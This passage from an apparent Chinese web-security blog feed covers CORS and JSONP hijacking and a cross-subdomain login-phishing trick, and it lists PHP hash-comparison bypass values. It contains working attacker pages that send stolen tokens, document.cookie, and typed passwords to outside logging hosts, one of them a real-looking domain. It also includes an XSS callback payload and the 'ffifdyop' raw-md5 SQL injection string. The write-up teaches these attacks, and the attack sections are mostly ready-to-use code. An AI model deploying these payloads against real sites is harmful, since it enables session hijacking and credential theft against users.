class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/json.php?callback=jsonp&quot;&gt;用户信息A&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/cors.php&quot;&gt;用户信息B&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/index.php?logout=1&quot;&gt;退出登录&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;悲催的A&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div style=&quot;margin-left: 100px&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;form id=&quot;login&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">        账户：&lt;input id=&quot;user&quot; type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        密码：&lt;input id=&quot;passwd&quot; type=&quot;password&quot; name=&quot;passwd&quot;&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> $_SESSION[<span class="string">&#x27;user&#x27;</span>].<span class="string">&#x27;登录成功&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- a.x.com/cors.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Origin:&#x27;</span>.$_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Origin: *&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">&quot;Access-Control-Allow-Credentials: true&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;user&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#123;&quot;id&quot;: 0, &quot;token&quot;: &quot;SuperSecTokenStr&quot;)&#125;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;请求失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- hack.com --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;hack站或有XSS的页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        fetch(<span class="string">&#x27;//a.x.com/cors.php&#x27;</span>, &#123;</span><br><span class="line">            credentials: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> response.text();</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">datas</span>) </span>&#123;</span><br><span class="line">            fetch(<span class="string">&#x27;//WebLog/&#x27;</span> ,&#123;</span><br><span class="line">                method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                mode: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">                body: JSON.stringify(datas)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/tyclykyld_ac.png"></p><ul><li><p>Chromium从Ver.80开始Cookies的SameSite默认为Lax，即会默认拦截跨域Cookie（感谢phithon师傅的强势指导），Firefox 68.6可以复现</p></li><li><p>可通过<code>Set-Cookie: SameSite=None; Secure</code>响应头显式地允许通过HTTPS传输跨域Cookie</p></li></ul><h2 id="攻击思路二"><a href="#攻击思路二" class="headerlink" title="攻击思路二"></a>攻击思路二</h2><p>当JSONP的动态处理页未设置<code>Content-Type</code>响应头时其默认为<code>text/html</code>，可能会导致反射XSS：<code>?callback=xss&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>将JSONP的动态处理页<code>Content-Type</code>响应头设置为<code>application/json</code>便可以防御反射XSS，但仍可能存在JSONP数据劫持</p><p>在讲JSONP数据劫持之前，先了解一下曾出现过的JSON数据劫持。假设<code>json.x.com</code>在校验登录成功后，会向客户端返回<code>account</code>之类的数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;account&quot;</span>: <span class="string">&quot;admin@x.com&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;...&quot;</span>: <span class="string">&quot;...&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取其之前的JSON数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype,<span class="string">&quot;account&quot;</span>,&#123;</span></span><br><span class="line"><span class="javascript">    set:<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// ...</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;json.x.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码通过重写Object类的set方法实现了对<code>account</code>属性的hook，目前该漏洞已被修复，可以通过本地测试来管中窥豹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype, <span class="string">&quot;Id&quot;</span>, &#123;</span><br><span class="line">    set:<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        alert(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这样怼属性可以</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">a.Id = <span class="number">666</span>;</span><br><span class="line"><span class="comment">// 这个JSON就不行了</span></span><br><span class="line"><span class="keyword">var</span> b=&#123;<span class="string">&quot;Id&quot;</span>:<span class="number">250</span>&#125;;</span><br></pre></td></tr></table></figure><p>看完了被修复的JSON劫持，再来看看目前依然存在的JSONP劫持。假设<code>a.x.com/index.php</code>负责校验身份并调用数据接口，<code>a.x.com/json.php</code>负责返回敏感数据，当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取敏感数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com/index.php --&gt;</span><br><span class="line"><span class="comment">// 与上例相同</span></span><br><span class="line"></span><br><span class="line">&lt;!-- a.x.com/json.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;user&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $callback.<span class="string">&#x27;(&#123;&quot;id&quot;: 0, &quot;token&quot;: &quot;SuperSecTokenStr&quot;&#125;)&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> $callback.<span class="string">&#x27;获取失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- hack.com --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;hack站或有XSS的页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hackfun</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> datas = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> key in obj) &#123;</span><br><span class="line">                <span class="keyword">var</span> tmp = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                tmp = key+<span class="string">&#x27;:&#x27;</span>+obj[key]+<span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                datas += tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            fetch(<span class="string">&#x27;//68943a75.y7z.xyz/&#x27;</span> ,&#123;</span><br><span class="line">                method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                mode: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">                body: document.cookie</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;http://a.x.com/json.php?callback=hackfun&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/tyclykyld_ab.png"></p><h2 id="攻击思路三（误）"><a href="#攻击思路三（误）" class="headerlink" title="攻击思路三（误）"></a>攻击思路三（误）</h2><p>假设<code>a.x.com</code>与<code>x.com</code>相互信任，利用<code>b.x.com</code>的XSS钓取a登录处的帐号密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- a.x.com/login.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>悲催的A<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 100px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;login&quot;</span> <span class="attr">action</span>=<span class="string">&quot;//baidu.com&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            账户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;account&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.domain=<span class="string">&quot;x.com&quot;</span>;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- b.x.com --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>有XSS的B<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//a.x.com/login.html&quot;</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">100%</span> <span class="attr">frameborder</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.domain=<span class="string">&#x27;x.com&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ifrm = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;iframe&#x27;</span>).contentWindow;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&#x27;iframe&#x27;</span>).onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            ifrm.document.getElementById(<span class="string">&#x27;submit&#x27;</span>).onmousedown = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> account = ifrm.document.getElementById(<span class="string">&quot;account&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> passwd = ifrm.document.getElementById(<span class="string">&quot;passwd&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> url = <span class="string">&#x27;//WebLog/?account=&#x27;</span>+account+<span class="string">&#x27;&amp;&#x27;</span>+<span class="string">&#x27;passwd=&#x27;</span>+passwd;</span></span><br><span class="line">                fetch(url, &#123;</span><br><span class="line"><span class="javascript">                    mode: <span class="string">&#x27;no-cors&#x27;</span></span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/tyclykyld_aa.png"></p><p>实战中XSS通常有限制，没机会插这么多代码进去，所以一般采用外联JS的方式引入，浏览器虽然会在控制台中报跨域错误并拦截响应，但通常仍可以正常发出请求并将敏感数据带至WebLog平台。抓包分析可以发现，虽然<code>&lt;iframe&gt;</code>放在了<code>&lt;script&gt;</code>前面，不过浏览器的请求顺序是：</p><ol start="0"><li><p>加载主页面</p></li><li><p>加载iframe<strong>标签</strong></p></li><li><p>加载外联JS</p></li><li><p>加载iframe<strong>内容</strong></p></li><li><p>用户按下<code>提交</code>按钮</p></li><li><p>执行劫持函数</p></li><li><p>表单提交</p></li></ol><p>这里说这么细是因为发现了一个有趣但蛋疼的问题，最初用作触发劫持函数的代码其实是用<code>document.getElementById(&#39;login&#39;).onsubmit</code>监测表单提交实现的，测试过程中一会可以一会嗝屁特别玄学，接着就开始了三天的对 浏览器、服务器、操作系统、网络地址、网络环境 一千多次的黑盒交叉测试（哭了），最终将影响因素锁定在表单提交后的新页面加载速度上。</p><p>因为如果 后者的加载速度 比 监测到表单提交并执行劫持函数 这一过程的速度要更快的话，新来的页面会将在内存中还未来得及执行完的劫持函数给刷掉。。。。。由于表单提交的默认监听事件是鼠标点击<code>提交</code>按钮（按下再松开），所以我将劫持函数的监听事件改为了检测鼠标按下，这样如果按下<code>提交</code>按钮后松得慢一点，就能产生一个让劫持函数执行完的时间缝隙Orz。。。。。当然如果点击的手速够快的话仙人可能也跳不到你</p><p>回过头看之前的实现方式，则是等用户点击<code>提交</code>按钮后，劫持函数 与 新页面加载 同时执行，拼的是 WebLog平台所在服务器 与 新页面所在服务器 的响应速度，不确定性就太多了。。。。。而改为 检测鼠标按下 后则在此基础上又开辟了 受害者点击 手速这个时间窗口23333</p><p>更新：经p师傅提醒，监听鼠标点击可能会错过通过<code>回车</code>或是<code>自动填充提交</code>方式提交的表单，所以为了保险可以两种方式同时使用</p><p>到此为止，有没有觉得哪里有点不对劲？如果目的是想利用<code>b.x.com</code>的XSS钓取a的帐号密码的话，为何不直接通过JS重写b的页面仿造成a登录处的样子并劫持表单输入呢？干嘛要用什么鬼跨域的逻辑绕来绕去（淦）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same-origin policy</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">Cross-Origin Resource Sharing</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch">Using Fetch</a></p><p><a href="https://www.freebuf.com/articles/web/208672.html">浅谈跨域威胁与安全</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;何为同源&quot;&gt;&lt;a href=&quot;#何为同源&quot; class=&quot;headerlink&quot; title=&quot;何为同源&quot;&gt;&lt;/a&gt;何为同源&lt;/h2&gt;&lt;p&gt;如果两个URL的协议、域名、端口一致则满足同源，&lt;code&gt;http&lt;/code&gt;与&lt;code&gt;https&lt;/code&gt;、&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cors" scheme="https://hosch3n.github.io/tags/cors/"/>
    
    <category term="jsonp" scheme="https://hosch3n.github.io/tags/jsonp/"/>
    
  </entry>
  
  <entry>
    <title>PHP哈希函数漏洞</title>
    <link href="https://hosch3n.github.io/2020/08/24/PHP%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/"/>
    <id>https://hosch3n.github.io/2020/08/24/PHP%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/</id>
    <published>2020-08-24T03:39:24.000Z</published>
    <updated>2020-09-24T16:14:39.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0e"><a href="#0e" class="headerlink" title="0e"></a>0e</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&#x27;0e123&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;0e456&#x27;</span>;</span><br><span class="line">$a == $b;</span><br><span class="line">$a !== $b;</span><br><span class="line"></span><br><span class="line">md5(<span class="string">&#x27;QNKCDZO&#x27;</span>) == md5(<span class="string">&#x27;240610708&#x27;</span>);</span><br><span class="line">md5(<span class="string">&#x27;s878926199a&#x27;</span>) == md5(<span class="string">&#x27;s155964671a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">sha1(<span class="string">&#x27;aaroZmOk&#x27;</span>) == sha1(<span class="string">&#x27;aaK1STfY&#x27;</span>);</span><br><span class="line">sha1(<span class="string">&#x27;aaO8zKZF&#x27;</span>) == sha1(<span class="string">&#x27;aa3OFF9m&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;0e251288019&#x27;</span> == hash(<span class="string">&#x27;md4&#x27;</span>, <span class="string">&#x27;0e251288019&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a = [<span class="number">0</span>];</span><br><span class="line">$b = [<span class="number">1</span>];</span><br><span class="line">$a != $b;</span><br><span class="line"></span><br><span class="line">md5($a) === md5($b);</span><br><span class="line"></span><br><span class="line">sha1($a) === sha1($b);</span><br><span class="line"></span><br><span class="line">hash(<span class="string">&#x27;md4&#x27;</span>, $a) == hash(<span class="string">&#x27;md4&#x27;</span>, $b);</span><br></pre></td></tr></table></figure><h2 id="‘or"><a href="#‘or" class="headerlink" title="‘or"></a>‘or</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stristr(md5(<span class="string">&#x27;ffifdyop&#x27;</span>, <span class="literal">true</span>), <span class="string">&quot;&#x27;or&#x27;&quot;</span>);</span><br><span class="line">stristr(md5(<span class="string">&#x27;129581926211651571912466741651878684928&#x27;</span>, <span class="literal">true</span>), <span class="string">&quot;&#x27;or&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><p>浮点值运算存在精度问题，反序列化时会出现值不等但运算后哈希相同。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0e&quot;&gt;&lt;a href=&quot;#0e&quot; class=&quot;headerlink&quot; title=&quot;0e&quot;&gt;&lt;/a&gt;0e&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="hash" scheme="https://hosch3n.github.io/tags/hash/"/>
    
    <category term="md" scheme="https://hosch3n.github.io/tags/md/"/>
    
    <category term="sha" scheme="https://hosch3n.github.io/tags/sha/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化</title>
    <link href="https://hosch3n.github.io/2020/08/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://hosch3n.github.io/2020/08/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-08-19T09:43:01.000Z</published>
    <updated>2020-10-14T08:08:07.000Z</updated>
    
